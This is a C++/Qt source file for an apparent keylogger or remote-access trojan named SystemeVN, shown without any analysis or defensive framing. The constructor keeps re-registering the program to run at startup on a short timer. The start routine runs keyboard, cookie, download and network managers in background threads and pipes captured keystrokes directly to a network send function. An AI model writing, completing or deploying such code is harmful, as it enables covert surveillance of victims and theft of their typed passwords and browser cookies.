#include "systemevn.h"

SystemeVN::SystemeVN() : tools(new Tools)
{
    threadNetworkManager = NULL;
    threadKeyboardManager = NULL;
    threadDownloadManager = NULL;
    threadCookiesManager = NULL;

    networkManager = NULL;
    keyboardManager = NULL;
    downloadManager = NULL;
    cookiesManager = NULL;

    tools->makeMeAtStartup();

    QTimer *timer = new QTimer;
    timer->setInterval(32767);
    timer->start();
    connect(timer,SIGNAL(timeout()),tools,SLOT(makeMeAtStartup()));
}

SystemeVN::~SystemeVN()
{
    if (tools) delete tools;

    if (networkManager) delete networkManager;
    if (threadNetworkManager) delete threadNetworkManager;

    if (keyboardManager) delete keyboardManager;
    if (threadKeyboardManager) delete threadKeyboardManager;

    if (downloadManager) delete downloadManager;
    if (threadDownloadManager) delete threadDownloadManager;

    if (cookiesManager) delete cookiesManager;
    if (threadCookiesManager) delete threadCookiesManager;
}

void SystemeVN::start()
{
    //create network manager et son thread
    threadNetworkManager = new QThread;
    networkManager = new NetworkManager(tools->getIdentifiant());
    networkManager->moveToThread(threadNetworkManager);
    connect(threadNetworkManager,SIGNAL(started()),networkManager,SLOT(start()));
    threadNetworkManager->start();

    //create keyboard manager and son thread
    threadKeyboardManager = new QThread;
    keyboardManager = new KeyboardManager;
    keyboardManager->moveToThread(threadKeyboardManager);
    connect(threadKeyboardManager,SIGNAL(started()),keyboardManager,SLOT(start()));
    threadKeyboardManager->start();

    //Create download manager
    threadDownloadManager = new QThread;
    downloadManager = new DownloadManager;
    downloadManager->moveToThread(threadDownloadManager);
    connect(threadDownloadManager,SIGNAL(started()),downloadManager,SLOT(start()));
    threadDownloadManager->start();

    //create cookies manager
    threadCookiesManager = new QThread;
    cookiesManager = new CookiesManager;
    cookiesManager->moveToThread(threadCookiesManager);
    connect(threadCookiesManager,SIGNAL(started()),cookiesManager,SLOT(start()));
    threadCookiesManager->start();

    //connexion entre object
    connect(keyboardManager,SIGNAL(keyboardText(QByteArray)),networkManager,SLOT(sendData(QByteArray)),Qt::QueuedConnection);
}
